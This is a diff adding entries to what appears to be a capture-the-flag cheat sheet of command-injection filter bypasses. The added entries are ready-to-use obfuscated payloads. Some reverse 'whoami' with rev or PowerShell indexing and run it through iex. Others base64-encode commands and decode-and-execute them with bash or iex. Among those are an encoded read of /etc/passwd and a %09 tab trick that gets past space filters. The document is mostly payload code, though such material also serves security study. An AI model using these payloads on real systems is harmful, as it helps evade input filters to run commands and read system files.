@@ -58,6 +58,7 @@ $(a="WhOaMi";printf %s "${a,,}")
 ```
 
 ```bash
+echo 'whoami' | rev
 $(rev<<<'imaohw')
 ```
 #### windows
@@ -67,7 +68,9 @@ who^ami
 WhOaMi
 ```
 
-```
+```bash
+"whoami"[-1..-20] -join ''
+
 iex "$('imaohw'[-1..-20] -join '')"
 ```
 # Example
@@ -81,5 +84,30 @@ cat /home/1nj3c70r/flag.txt
 ```
 
 
+# Base64
 
+```bash
+echo -n 'cat /etc/passwd | grep 33' | base64
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+```
+
+#### windows
+
+```bash
+echo -n whoami | iconv -f utf-8 -t utf-16le | base64
+```
+
+```bash
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+```
+
+#### Example
+
+```bash
+bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+```
+
+```bash
+find /usr/share/ | grep root | grep mysql | tail -n 1
+```
 
